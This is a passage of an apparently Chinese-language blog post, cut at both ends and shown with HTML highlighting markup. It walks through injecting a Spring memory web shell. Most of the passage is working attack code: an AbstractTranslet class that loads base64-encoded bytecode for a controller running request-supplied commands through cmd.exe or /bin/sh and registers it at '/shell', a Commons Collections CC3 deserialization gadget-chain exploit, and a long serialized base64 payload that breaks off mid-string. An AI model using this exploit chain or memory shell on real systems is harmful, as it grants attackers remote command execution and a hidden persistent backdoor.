java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerBehind</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//åŠ è½½magicControllerç±»çš„å­—èŠ‚ç </span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>            System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        Method mm = (Class.forName(&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;).getDeclaredMethods())[0];</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>            rs.registerMapping(info, instance, mm);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®æŠŠå‰é¢çš„æ‹¿æ¥å¤ç”¨ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œåªä¸è¿‡è¿™é‡Œå†æŠŠæµç¨‹å®Œæ•´è®°å½•ä¸€ä¸‹</p><p>ç„¶åæœ¬åœ°åŠ äº†ä¸€ä¸ªccä¾èµ–ï¼Œç”¨cc3æ¥æ‰“å…¥å†…å­˜é©¬è¿›è¡Œæµ‹è¯•</p><p>cc3expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Chain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;ControllerBehind.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//è¿™é‡Œçš„èµ‹å€¼åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¸éœ€è¦äº†</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//ç»“åˆå‰é¢çš„é“¾å­ä¸²è”èµ·æ¥ï¼Œéšä¾¿ä¸€ä¸ªéƒ½è¡Œ</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆçš„base64å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAfc8r+ur4AAAA0AMgKAC4AYwgAZAcAZQoAAwBjCgADAGYHAGcIAGgHAGkHAGoHAEgJAGsAbAoACABtCgBuAG8KAHAAcQoAcAByBwBzCAB0CgBrAHUKAG4AdgoACAB3CgB4AHkJAHoAewcAfAoAFwBjCAB9CgAXAH4KABcAfwoAFwCACgCBAIIKAIMAhAgAhQsAhgCHBwCIBwCJCACKCgAiAIsHAIwKACUAjQcAjgsAIQCPCgAIAJAKACcAkQcAkgoAKwCTBwCUBwCVAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2Nsb3duL0NvbnRyb2xsZXJCZWhpbmQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAJYBABBNZXRob2RQYXJhbWV0ZXJzAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEABGNvZGUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFkAQACW0IBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAIaW5zdGFuY2UBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAA3VybAEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAJycwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAAm1tAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAIkxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwqPjsBAA1TdGFja01hcFRhYmxlBwCSAQAKU291cmNlRmlsZQEAFUNvbnRyb2xsZXJCZWhpbmQuamF2YQwALwAwAQsweXY2NnZnQUFBRFFBaFFvQUlRQkJDQUJDQ3dCREFFUUxBRVVBUmdnQVJ3Z0FTQW9BU1FCS0NnQU1BRXNJQUV3S0FBd0FUUWNBVGdjQVR3Z0FVQWdBVVFvQUN3QlNDQUJUQ0FCVUJ3QlZDZ0FMQUZZS0FGY0FXQW9BRWdCWkNBQmFDZ0FTQUZzS0FCSUFYQW9BRWdCZENnQVNBRjRLQUY4QVlBb0FYd0JoQ2dCZkFGNExBRVVBWWdjQVl3Y0FaQWNBWlFFQUJqeHBibWwwUGdFQUF5Z3BWZ0VBQkVOdlpHVUJBQTlNYVc1bFRuVnRZbVZ5VkdGaWJHVUJBQkpNYjJOaGJGWmhjbWxoWW14bFZHRmliR1VCQUFSMGFHbHpBUUE3VEc5eVp5OWpiRzkzYmk5emNISnBibWRpYjI5MGJXVnRiM0o1YzJobGJHd3ZZMjl1ZEc5eWJHeGxjaTlVWlhOMFEyOXVkSEp2Ykd4bGNqc0JBQVIwWlhOMEFRQlNLRXhxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYRjFaWE4wTzB4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sY25ac1pYUlNaWE53YjI1elpUc3BWZ0VBQVhBQkFCcE1hbUYyWVM5c1lXNW5MMUJ5YjJObGMzTkNkV2xzWkdWeU93RUFBVzhCQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBRmpBUUFUVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUJHRnlaekFCQUFaM2NtbDBaWElCQUJWTWFtRjJZUzlwYnk5UWNtbHVkRmR5YVhSbGNqc0JBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQU5VM1JoWTJ0TllYQlVZV0pzWlFjQVR3Y0FaZ2NBVGdjQVZRY0FZd0VBRUUxbGRHaHZaRkJoY21GdFpYUmxjbk1CQUFwVGIzVnlZMlZHYVd4bEFRQVRWR1Z6ZEVOdmJuUnliMnhzWlhJdWFtRjJZUXdBSWdBakFRQUVZMjlrWlFjQVp3d0FhQUJwQndCcURBQnJBR3dCQUFBQkFBZHZjeTV1WVcxbEJ3QnREQUJ1QUdrTUFHOEFjQUVBQTNkcGJnd0FjUUJ5QVFBWWFtRjJZUzlzWVc1bkwxQnliMk5sYzNOQ2RXbHNaR1Z5QVFBUWFtRjJZUzlzWVc1bkwxTjBjbWx1WndFQUIyTnRaQzVsZUdVQkFBSXZZd3dBSWdCekFRQUhMMkpwYmk5emFBRUFBaTFqQVFBUmFtRjJZUzkxZEdsc0wxTmpZVzV1WlhJTUFIUUFkUWNBZGd3QWR3QjREQUFpQUhrQkFBSmNRUXdBZWdCN0RBQjhBSDBNQUg0QWNBd0Fmd0FqQndCbURBQ0FBSUVNQUlJQUl3d0Fnd0NFQVFBVGFtRjJZUzlzWVc1bkwwVjRZMlZ3ZEdsdmJnRUFPVzl5Wnk5amJHOTNiaTl6Y0hKcGJtZGliMjkwYldWdGIzSjVjMmhsYkd3dlkyOXVkRzl5Ykd4bGNpOVVaWE4wUTI5dWRISnZiR3hsY2dFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRQkFCTnFZWFpoTDJsdkwxQnlhVzUwVjNKcGRHVnlBUUFsYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnhkV1Z6ZEFFQURHZGxkRkJoY21GdFpYUmxjZ0VBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQW1hbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WemNHOXVjMlVCQUFsblpYUlhjbWwwWlhJQkFCY29LVXhxWVhaaEwybHZMMUJ5YVc1MFYzSnBkR1Z5T3dFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBdG5aWFJRY205d1pYSjBlUUVBQzNSdlRHOTNaWEpEWVhObEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFoamIyNTBZV2x1Y3dFQUd5aE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFdnRUFGaWhiVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBVnpkR0Z5ZEFFQUZTZ3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUIyaGhjMDVsZUhRQkFBTW9LVm9CQUFSdVpYaDBBUUFGWTJ4dmMyVUJBQVYzY21sMFpRRUFGU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVmdFQUJXWnNkWE5vQVFBSmMyVnVaRVZ5Y205eUFRQUVLRWtwVmdBaEFDQUFJUUFBQUFBQUFnQUJBQ0lBSXdBQkFDUUFBQUF2QUFFQUFRQUFBQVVxdHdBQnNRQUFBQUlBSlFBQUFBWUFBUUFBQUEwQUpnQUF